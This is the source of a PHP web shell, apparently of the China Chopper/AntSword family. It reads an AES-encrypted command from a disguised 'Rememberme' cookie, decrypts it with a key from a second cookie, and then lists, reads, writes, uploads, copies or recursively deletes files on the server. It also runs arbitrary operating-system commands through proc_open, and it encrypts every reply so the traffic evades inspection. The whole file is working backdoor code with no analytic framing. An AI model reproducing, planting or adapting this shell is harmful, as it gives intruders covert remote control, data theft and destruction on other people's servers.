<?php
@ini_set("display_errors", "0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);

function encrypt($origData, $key) {
    $algorithm = MCRYPT_RIJNDAEL_128;
    $mode = MCRYPT_MODE_CBC;
    $encrypter = mcrypt_module_open($algorithm, '', $mode, '');
    $origData = pkcs5padding($origData, mcrypt_enc_get_block_size($encrypter));
    mcrypt_generic_init($encrypter, $key, substr($key, 0, 16));
    $ciphertext = mcrypt_generic($encrypter, $origData);
    mcrypt_generic_deinit($encrypter);
    mcrypt_module_close($encrypter);
    return $ciphertext;
}
function decrypt($ciphertext, $key) {
    $algorithm = MCRYPT_RIJNDAEL_128;
    $mode = MCRYPT_MODE_CBC;
    $encrypter = mcrypt_module_open($algorithm, '', $mode, '');
    mcrypt_generic_init($encrypter, $key, substr($key, 0, 16));
    $origData = mdecrypt_generic($encrypter, $ciphertext);
    mcrypt_generic_deinit($encrypter);
    mcrypt_module_close($encrypter);
    return pkcs5unPadding($origData);
}
function pkcs5padding($data, $blocksize) {
    $padding = $blocksize - strlen($data) % $blocksize;
    $paddingText = str_repeat(chr($padding) , $padding);
    return $data . $paddingText;
}
function pkcs5unPadding($data) {
    $length = strlen($data);
    $unpadding = ord($data[$length - 1]);
    return substr($data, 0, $length - $unpadding);
}


$key = isset($_COOKIE['t']) ? $_COOKIE['t'] : '';
$value = isset($_COOKIE['Rememberme']) ? $_COOKIE['Rememberme'] : '';
if($key===""||$value===""){
	die();
}
//$value = str_replace("%3D","=",$value);
//$value = str_replace("%2B","+",$value);
$value = str_replace(["%3D","%2B"],["=","+"],$value);
try{
	$newvalue = decrypt(base64_decode($value),$key);
}catch(Exception $e)
{
	die();
}

$vaules= split("<\\|\\|>",$newvalue);

if (count($vaules)!==4){
	  die();
}

header("Content-type: text/html; charset={$vaules[1]}"); 

$z = $vaules[0];
global $sb;
$sb .= "->|";
if ($z == "A") {
    $s = dirname(__file__);
    $sb .= $s . "\t";
    if (substr($s, 0, 1) != "/") {        {
            foreach (range("A", "Z") as $L)
                if (is_dir($L . ":"))
                    $sb .= $L . ":";
            $sb .= "|<-";
        }
    }
} else
    if ($z == "B") {
        $D = get_magic_quotes_gpc() ? stripslashes($vaules[2]) : $vaules[2];
        $F = @opendir($D);
        if ($F == null) {
            $sb .= ("ERROR:// Path Not Found Or No Permission!");
        } else {
            $M = null;
            $L = null;
            while ($N = @readdir($F)) {
                if ($N != "." && $N != "..") {
                    $P = $D . DIRECTORY_SEPARATOR . $N;
                    $sQ = is_readable($P) ? "R" : "";
                    $sQ .= is_writable($P) ? "W" : "";
                    $T = @date("Y-m-d H:i:s", @filemtime($P));
                    $R = "\t" . $T . "\t" . @filesize($P) . "\t" . $sQ . "\r\n";
                    if (@is_dir($P))
                        $M .= $N . "/" . $R;
                    else
                        $L .= $N . $R;
                }
            }
            $sb .= $M . $L;
            @closedir($F);
        }
        $sb .= ("|<-");

    } else
        if ($z == "C") {
            $F = get_magic_quotes_gpc() ? stripslashes($vaules[2]) : $vaules[2];
            $P = @fopen($F, "r");
            $sb .= (@fread($P, filesize($F)));
            @fclose($P);
            $sb .= ("|<-");
        } else
            if ($z == "D") {
                $sb .= ("->|");
                $sb .= @fwrite(fopen($vaules[2], "w"), $vaules[3]) ? "1" : "0";
                $sb .= ("|<-");
            } else
                if ($z == "E") {
                    function df($p)
                    {
                        $m = @dir($p);
                        while (@$f = $m->read()) {
                            $pf = $p . "/" . $f;
                            if ((is_dir($pf)) && ($f != ".") && ($f != "..")) {
                                @chmod($pf, 0777);
                                df($pf);
                            }
                            if (is_file($pf)) {
                                @chmod($pf, 0777);
                                @unlink($pf);
                            }
                        }
                        $m->close();
                        @chmod($p, 0777);
                        return @rmdir($p);
                    }
                    $F = get_magic_quotes_gpc() ? stripslashes($vaules[2]) : $vaules[2];
                    if (is_dir($F))
                        $sb .= (df($F));
                    else {
                        $sb .= (file_exists($F) ? @unlink($F) ? "1" : "0" : "0");
                    }
                    ;
                    $sb .= ("|<-");
                } else
                    if ($z == "F") { 
                        $F = get_magic_quotes_gpc() ? stripslashes($vaules[2]) : $vaules[2];
                        $fp = @fopen($F, "r");
                        if (@fgetc($fp)) {
                            @fclose($fp);
                            @readfile($F);
                        } else {
                            $sb .= ("ERROR:// Can Not Read");
                        }
                        $sb .= ("|<-");
                    } else
                        if ($z == "G") { 
                            $f = $vaules[2];
                            $c = $vaules[3];
                            $c = str_replace("\r", "", $c);
                            $c = str_replace("\n", "", $c);
                            $buf = "";
                            for ($i = 0; $i < strlen($c); $i += 2)
                                $buf .= urldecode("%" . substr($c, $i, 2));
                            $sb .= (@fwrite(fopen($f, "w"), $buf) ? "1" : "0");
                            $sb .= ("|<-");
                        } else
                            if ($z == "I") {

                            } else
                                if ($z == "J") {
                                    $f = get_magic_quotes_gpc() ? stripslashes($vaules[2]) : $vaules[2];
                                    $sb .= (mkdir($f) ? "1" : "0");
                                    $sb .= ("|<-");
                                } else
                                    if ($z == "L") {
                                        $fR = $vaules[2];
                                        $fL = $vaules[3];
                                        $F = @fopen($fR, chr(114));
                                        $L = @fopen($fL, chr(119));
                                        if ($F && $L) {
                                            while (!feof($F))
                                                @fwrite($L, @fgetc($F));
                                            @fclose($F);
                                            @fclose($L);
                                            $sb .= ("1");
                                        } else {
                                            $sb .= ("0");
                                        }
                                        $sb .= ("|<-");
                                    } else
                                        if ($z = "M") {
											$m = get_magic_quotes_gpc();
											$p = $m ? stripslashes($_REQUEST["z1"]) : $_REQUEST["z1"];
											$s = $m ? stripslashes($_REQUEST["z2"]) : $_REQUEST["z2"];
											$d = dirname($_SERVER["SCRIPT_FILENAME"]);
											$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";										
											$r = "{$p} {$c}";
											var_dump($p);
                                            $array = array(
                                                array("pipe", "r"),
                                                array("pipe", "w"),
                                                array("pipe", "w"));
                                            $fp = proc_open($r . " 2>&1", $array, $pipes);
                                            $ret = stream_get_contents($pipes[1]);
                                            proc_close($fp);
											$sb .= $ret;
                                            $sb .= ("|<-");
                                        }else{
										die();
										}
								die(base64_encode(encrypt($sb,$key)));
?>